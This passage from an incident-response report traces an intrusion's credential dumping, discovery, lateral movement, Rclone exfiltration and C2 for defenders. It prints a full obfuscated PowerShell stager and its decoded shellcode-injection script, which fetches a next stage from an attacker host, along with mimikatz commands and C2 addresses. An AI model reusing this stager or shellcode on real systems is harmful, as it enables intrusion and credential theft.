<p>Process execution logs, however, highlighted some of the manual deletions performed by the threat actor, either through native actions, (e.g. the <i>del</i> command) as well as through their attacker tools (e.g. using <i>rclone config</i> to erase attacker credentials).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-032-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21579" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-032-1.png" alt width="450" height="205" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-032-1.png 450w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-032-1-300x137.png 300w" sizes="(max-width: 450px) 100vw, 450px" /></a></p>
<p>&nbsp;</p>
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<h3 class="wp-block-heading">LSASS Dumping</h3>
<p>Throughout the intrusion, the threat actor accessed LSASS on multiple occasions, a pattern commonly leveraged for credential dumping and injection. As can be seen in the following capture, the threat actor&#8217;s actions even resulted in LSASS crashing on one host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21578" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-033.png" alt width="845" height="564" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-033.png 845w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-033-300x200.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-033-768x513.png 768w" sizes="(max-width: 845px) 100vw, 845px" /></a></p>
<p>To help facilitate credential dumping, the threat actor dropped the file <i>m2.exe</i>. This appeared to be a custom compiled mimikatz binary. We can confirm the file being mimikatz-related, using YARA rules published in the <a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="noreferrer noopener">mimikatz repository</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21581" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-034.png" alt width="503" height="89" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-034.png 503w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-034-300x53.png 300w" sizes="(max-width: 503px) 100vw, 503px" /></a></p>
<p>Through dynamic analysis, we can confirm the <i>m2.exe</i> binary is essentially set up to automatically run the <i>privilege::debug</i> (privilege escalation) and <i>sekurlsa::logonpasswords</i> (credential access) mimikatz commands on execution, rather than require user input or command line arguments.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21582" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-035.png" alt width="1110" height="660" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-035.png 1110w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-035-300x178.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-035-1024x609.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-035-768x457.png 768w" sizes="(max-width: 1110px) 100vw, 1110px" /></a></p>
<p>While the LSASS dumps align with the intention and abuse of additional credentials, it remains unclear how the initial local administrator account was obtained.</p>
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<h3 class="wp-block-heading">ScreenConnect</h3>
<p>As part of the initial discovery, the threat actor leveraged ScreenConnect&#8217;s command execution to obtain system, network, users and domain administrators information. This activity can typically be traced through the process creation logs (Security <i>4688</i> and Sysmon <i>1</i>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21583" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-036.png" alt width="937" height="118" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-036.png 937w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-036-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-036-768x97.png 768w" sizes="(max-width: 937px) 100vw, 937px" /></a></p>
<h3 class="wp-block-heading">Cobalt Strike</h3>
<p>After launching Cobalt Strike DLL beacons, the threat actor used several <i>nltest</i> commands to look up domain information.</p>
<pre>cmd.exe /C nltest /dclist:
cmd.exe /C nltest /DOMAIN_TRUSTS
cmd.exe /C nltest /domain_trusts /all_trusts
</pre>
<h3 class="wp-block-heading">quser</h3>
<p>Later, throughout the intrusion, the threat actor leveraged <a href="https://github.com/rapid7/metasploit-framework/blob/2722067108b5c034da9f77b95eaf1c1db33db4fa/modules/auxiliary/scanner/smb/impacket/wmiexec.py#L127" target="_blank" rel="noreferrer noopener">Impacket&#8217;s </a><i><a href="https://github.com/rapid7/metasploit-framework/blob/2722067108b5c034da9f77b95eaf1c1db33db4fa/modules/auxiliary/scanner/smb/impacket/wmiexec.py#L127" target="_blank" rel="noreferrer noopener">WMIEXEC</a></i><a href="https://github.com/rapid7/metasploit-framework/blob/2722067108b5c034da9f77b95eaf1c1db33db4fa/modules/auxiliary/scanner/smb/impacket/wmiexec.py#L127" target="_blank" rel="noreferrer noopener"> class over Metasploit</a> to discover active user sessions using the <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser"><i>quser</i> command</a>.</p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21585" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-037.png" alt width="944" height="141" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-037.png 944w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-037-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-037-768x115.png 768w" sizes="(max-width: 944px) 100vw, 944px" /></a></p>
<h3 class="wp-block-heading">adcomp.bat</h3>
<p>The threat actor was also observed running a bash script called <i>adcomp.bat,</i> in order to enumerate the names, OS versions, IP addresses, and other information on the domain controllers.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21586" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-038.png" alt width="1018" height="103" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-038.png 1018w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-038-300x30.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-038-768x78.png 768w" sizes="(max-width: 1018px) 100vw, 1018px" /></a></p>
<p>The content of this script was the following PowerShell command:</p>
<pre>powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address</pre>
<h3>Netping</h3>
<p>We observed the threat actor drop a binary named <i>netping.exe</i> early in the third day of the intrusion, which they promptly executed (and later erased) as outlined in Sysmon&#8217;s process creation logs.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21587" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-039.png" alt width="2006" height="148" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-039.png 2006w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-039-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-039-1024x76.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-039-768x57.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-039-1536x113.png 1536w" sizes="(max-width: 2006px) 100vw, 2006px" /></a></p>
<p>While Sysmon&#8217;s network events do not record ICMP traffic, network captures recorded at the same time a PING-sweep (ICMP type 8) of 255 hosts confirming the netping executable was likely leveraged to identify devices on the <i>/24</i> range.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21588" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-040.png" alt width="1687" height="1005" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-040.png 1687w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-040-300x179.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-040-1024x610.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-040-768x458.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-040-1536x915.png 1536w" sizes="(max-width: 1687px) 100vw, 1687px" /></a></p>
<h3 class="wp-block-heading">Netscan</h3>
<p>NetScan from <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">SoftPerfect</a> has been reported <a href="https://thedfirreport.com/?s=netscan" target="_blank" rel="noreferrer noopener">multiple times</a> as a tool of choice for network discovery. This time, the threat actor dropped it on the third day of the intrusion to perform an RDP (port <i>3389</i>) scan.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21589" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-041.png" alt width="793" height="535" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-041.png 793w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-041-300x202.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-041-768x518.png 768w" sizes="(max-width: 793px) 100vw, 793px" /></a></p>
<h3 class="wp-block-heading">Manual Discovery</h3>
<p>On the file server, the threat actor was seen browsing several folders around the same time these were exfiltrated, confirming manual exfiltration from hands-on keyboard activities. This can be seen by examining the ShellBags registry artifact using Eric Zimmerman&#8217;s <a href="https://ericzimmerman.github.io/#!index.md" target="_blank" rel="noreferrer noopener">ShellBags Explorer</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21590" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-042.png" alt width="842" height="287" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-042.png 842w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-042-300x102.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-042-768x262.png 768w" sizes="(max-width: 842px) 100vw, 842px" /></a></p>
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<h3 class="wp-block-heading">Remote Desktop Protocol</h3>
<p>As expected after the RDP scan, the actor was observed performing lateral movement using the Remote Desktop Protocol from a single compromised server. <span style="color: #000000;">While for remote interactive sign-ins the origin workstation name matched the targeted machines, network logons using both the same compromised accounts and the origin server had a workstation name of <i>WIN-RRRU9REOK18</i>.</span></p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21591" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-043.png" alt width="860" height="475" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-043.png 860w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-043-300x166.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-043-768x424.png 768w" sizes="(max-width: 860px) 100vw, 860px" /></a><img alt /></figure>
<p>Between RDP connections, re-connections were observed as shown by the presence of logon types <i>7</i> (<i>Unlock</i>) indicating additional RDP activity took place on the file share and backup servers.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21592" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-044.png" alt width="2017" height="578" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-044.png 2017w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-044-300x86.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-044-1024x293.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-044-768x220.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-044-1536x440.png 1536w" sizes="(max-width: 2017px) 100vw, 2017px" /></a></figure>
<h3 class="wp-block-heading"> </h3>
<h3 class="wp-block-heading">WMIEXEC</h3>
<p>As shown previously, the threat actor leveraged <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer noopener">Impacket&#8217;s </a><i><a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer noopener">WMIEXEC</a></i><a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer noopener"> class</a> to perform lateral movement (specifically execution). Detecting such activity can be done through a combination of patterns available in process creation events (e.g. Sysmon event <i>1</i>) which have been <a href="https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/" target="_blank" rel="noreferrer noopener">outlined by CrowdStrike</a>:</p>
<ul class="wp-block-list">
<li>A <a href="https://github.com/fortra/impacket/blob/6a3ecf7efc7dd686cc4c5fec46bbaa15ea679039/examples/wmiexec.py#L127C25-L127C39" target="_blank" rel="noreferrer noopener">command-line starting</a> with <i>cmd.exe /Q /c </i>.</li>
<li>A <a href="https://github.com/fortra/impacket/blob/6a3ecf7efc7dd686cc4c5fec46bbaa15ea679039/examples/wmiexec.py#L295" target="_blank" rel="noreferrer noopener">command-line ending with the redirection of outputs</a> as <i>1&gt; \\127.0.0.1\{{share}}\{{output}} 2&gt;&amp;1</i> where the output contains the current timestamp.</li>
<li>A parent process of <i>wmiprvse.exe</i> due to the usage of WMI.</li>
</ul>
<p>The following capture is a subset of the attacker-initiated WMI-backed executions.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21593" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-045.png" alt width="3249" height="513" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-045.png 3249w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-045-300x47.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-045-1024x162.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-045-768x121.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-045-1536x243.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-045-2048x323.png 2048w" sizes="(max-width: 3249px) 100vw, 3249px" /></a></figure>
<h3 class="wp-block-heading"> </h3>
<h3 class="wp-block-heading">Remote Services</h3>
<p>Throughout the intrusion, the threat actor relied on remote services for lateral movement. One of the commonly employed tactics relies on the deployment of malicious files, DLLs in our case, over SMB, followed by its execution through remote services.</p>
<p>As part of the file creation over SMB, the Security log&#8217;s event <i>5145</i> (<a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145" target="_blank" rel="noreferrer noopener">A network share object was checked to see whether client can be granted desired access</a>) maintains traces of access checks performed prior to SMB actions being taken. As can be seen below, the <i>5145</i> event provides valuable network share insights, such as which user attempts to perform an operation and from where.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21594" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-046.png" alt width="861" height="573" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-046.png 861w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-046-300x200.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-046-768x511.png 768w" sizes="(max-width: 861px) 100vw, 861px" /></a></figure>
<p>Similarly, these file creation events can also be observed via network logs like Zeek&#8217;s <i>smb_files</i> events.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21595" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-047.png" alt width="1036" height="422" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-047.png 1036w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-047-300x122.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-047-1024x417.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-047-768x313.png 768w" sizes="(max-width: 1036px) 100vw, 1036px" /></a></figure>
<p>After the file creation over SMB, the System event <i>7045</i> will register the service installations.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21596" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-048.png" alt width="1187" height="129" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-048.png 1187w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-048-300x33.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-048-1024x111.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-048-768x83.png 768w" sizes="(max-width: 1187px) 100vw, 1187px" /></a></figure>
<p>In these cases, the DLLs are believed to have been Cobalt Strike beacons towards the newly used <i>23.108.57[.]83:443</i> (<i>sodiwugoc[.]com</i>) command &amp; control infrastructure.</p>
<h4 class="wp-block-heading">Fileless</h4>
<p>Besides the DLLs, the threat actor was seen performing one fileless lateral movement, where the remote service triggered the following PowerShell stager.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21597" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-049.png" alt width="1905" height="106" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-049.png 1905w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-049-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-049-1024x57.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-049-768x43.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-049-1536x85.png 1536w" sizes="(max-width: 1905px) 100vw, 1905px" /></a></p>
<pre>C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAOZQUWMCA7VWbW/aSBD+nEj5D1aFZFshGAfaNJEq3ZpXE5xADATCodNir+2FtQ32GgK9/vcbg52m17RqTzorL+vdmdmZZ56ZsZMEFqdhIJBJXfh8dnrSwxH2BanAW4uiUOADP1rLJydwUAjeC58EaYpWq3roYxrMbm5qSRSRgB/fSy3CURwTf84oiSVZ+Ft49EhELu7nC2Jx4bNQ+KvUYuEcs0xsV8OWR4QLFNjpWTe0cOpLyVwxyiXxzz9FeXqhzkqNdYJZLInmLubEL9mMibLwRU4vHOxWRBINakVhHDq89EiDymVpGMTYIXdgbUMMwr3QjkUZYoCfiPAkCgSIJlU/HkoiLHtRaCHbjkgci0VhmhqezmZ/SNPs1ock4NQnJT3gJApXJok21CJxqY0Dm5EH4sxAy+QRDdyZLIPYJlwSqRAkjBWF3zEj3ZFtjtmvKkmvlUCqxyO5CFn8LkojtBNGjnriG26meZfheck9wPbl7PTs1MmJ4rHXPIHVyfSwJuCa1AtjepD6JJSLggHXYB5GO3gtDKKEyLMXYIXCrv/wUPyxvpoLg+jWgo3pKKT2DBSyTBY2w9TwTwhZJw4NSH0XYJ9aOeekt/AlDiOH8Eq52B14JInZAbHrhBEX8xSzNM3fqTV8yl90tYQym0TIghzF4BWkT/7WmWMaJFEPDOIDQMd34F3BAaaTXDpj9y6/PX0HIbHGcBwXhV4CpWYVBZNgRuyigIKYZkco4eFhKX5110gYpxaOeW5uJmcwZtfVwiDmUWJByiD0gbkiFsUsRaIotKlNtJ1J3fxa8U0capgxqACwtIE8wE4av8lTIkTg4SHpcskkXPdXjPggcyj5JsMuFHjG8wNzsEts8V8O5kQ+sjZFIofglXuQXpOFvCiMaMShcaSobq3/dverhpF6UYtIlgUpr4uptuMpnwse73yspXzMQDlAEHEIvxmFvoZj8qF6bA/SO+We1hA8Ez1ghqUtqYq2VNUN+B3Sih7Wr+zbzqKtRPVnz0F6rBvtXr3fblc3HXNU5WZD57c9nRuN8WJhovbDcMKfdNQe0PJyUt2vOnRvdpE9eVY+7LX9tqw97xeu7UzqjuNeOeaD+r5Ju4+1vla+xN16I+k+alutXI0bdNvu02F/2Wny+WTE8NBR3LF6jelzN1qM1NDY6wi1vIq17zijlmfYu0mbkoVS7tI+6iN0az0Mhy135bZipFyP1ggGwIfapoORjhqjXec90/rDpoaGDa2P78Ne5byuqE/2utF8GuOOz+xWW1EnY2SjSBm4nnp17wUpTtjV1loqg7pPu6YCMr0qalcv6f5p3W+5qAEyIz9EuEmXw/Mx2LwbgM7jULVDxAN9rCgjV3GRY3oTjDSQ1taoqYW13cee0VNGo0tPnS9VD3wm481Ho4POm1ZPUZRzfw5/FWQZq+dgrG2vNm7bDG/xLR5tniqKOti2HLRG5+eaqs15u1HpbODegXI9/PQu5Q8QqBA8Xr+ixY9auYGj2MMM6AJdOi/QZhg1s77bC2mqIUnpoF6SKCAMBh2MwpzmiLHQSps+NGgYN8chkM6kISwrl2+uZOFFUP46DPKtm5sncBEK50DtUpcELveK5edKuQzNvfxcLUOIvx5XLVztpKOtYjodUmBejLODcTmtqEI818P/FbGsjD34Z/8csa97Pzn9JRTLxUO83+1+u/FbgP5u2I+YchA0oQUxchyAb0WfUePVx0GaEMi7kz3pl919wi/u4Jvh7PQfmcFDmkIKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"</pre>
<p>Using PowerShell logs&#8217; event <i>4104</i> (part of <a href="https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7.3" target="_blank" rel="noreferrer noopener">PowerShell Script Tracing and Logging</a>), one can recover the decoded PowerShell, which in this case executes shellcode into the PowerShell process itself.</p>
<pre>function eYD {
	Param ($tGj, $tTmrq)		
	$n5 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $n5.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($n5.GetMethod('GetModuleHandle')).Invoke($null, @($tGj)))), $tTmrq))
}

function hl {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $yQRR,
		[Parameter(Position = 1)] [Type] $wc = [Void]
	)
	
	$vUy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$vUy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $yQRR).SetImplementationFlags('Runtime, Managed')
	$vUy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wc, $yQRR).SetImplementationFlags('Runtime, Managed')
	
	return $vUy.CreateType()
}

[Byte[]]$htJ8C = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqAWhe6CvJaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
		
$nW9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eYD kernel32.dll VirtualAlloc), (hl @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $htJ8C.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($htJ8C, 0, $nW9, $htJ8C.length)

$sbIo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eYD kernel32.dll CreateThread), (hl @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nW9,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eYD kernel32.dll WaitForSingleObject), (hl @([IntPtr], [Int32]))).Invoke($sbIo,0xffffffff) | Out-Null
</pre>
<p>As was the case for the previous shellcode, this stager retrieves the next stage using websockets from <i>94.232.43[.]201:4444</i>.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21598" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-050.png" alt width="1070" height="791" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-050.png 1070w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-050-300x222.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-050-1024x757.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-050-768x568.png 768w" sizes="(max-width: 1070px) 100vw, 1070px" /></a><img alt /></figure>
<h2 class="wp-block-heading">Exfiltration</h2>
<p>After two days and 11 hours, the threat actor dropped <a href="https://rclone.org/" target="_blank" rel="noreferrer noopener">Rclone</a> on a file server and exfiltrated several files over SFTP to <i>190.2.146[.]96:22</i> . The typos made on the commands, and the time it took to exfiltrate the files, suggest that exfiltration happened manually (hands-on-keyboard activity):</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21599" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-051.png" alt width="436" height="343" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-051.png 436w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-051-300x236.png 300w" sizes="(max-width: 436px) 100vw, 436px" /></a></figure>
<p>The exfiltration could easily be spotted from a network perspective in controlled environments since the amount of exfiltrated data is very high compared to the usual traffic:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21600" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-052.png" alt width="963" height="461" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-052.png 963w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-052-300x144.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-052-768x368.png 768w" sizes="(max-width: 963px) 100vw, 963px" /></a></figure>
<p>We reported on the usage of Rclone in a couple of our <a href="https://thedfirreport.com/?s=rclone" target="_blank" rel="noreferrer noopener">previous reports</a>. Additionally, <a href="https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/" target="_blank" rel="noreferrer noopener">this blog from NCC Group</a> is a great resource for understanding exfiltration via Rclone and detecting this activity using Sigma rules.</p>
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<p>Throughout the intrusion, multiple Command &amp; Control channels were established. Some channels relied on legitimate RMM services (ScreenConnect, Atera &amp; Splashtop) while other tooling is specifically adversary (Cobalt Strike, Metasploit). The following timeseries (logarithmic scale) outlines the traffic generated by the different tooling, highlighting their deployment &amp; usage order.</p>
<p>Most interesting is how, solely from a network perspective, a drastic anomalous increase in activity can be observed hours/minutes prior to the exfiltration and impact stages. This rupture in C2 patterns without new infections offers incident responders potential telltale signs of an imminent change of adversary intent.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21601" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-053.png" alt width="1632" height="833" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-053.png 1632w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-053-300x153.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-053-1024x523.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-053-768x392.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-053-1536x784.png 1536w" sizes="(max-width: 1632px) 100vw, 1632px" /></a></figure>
<p>To provide a perspective on the above logarithmic scale, the approximate one hour and 30 minutes of Rclone exfiltration accounted for more than 90% of the attacker-generated network traffic.</p>
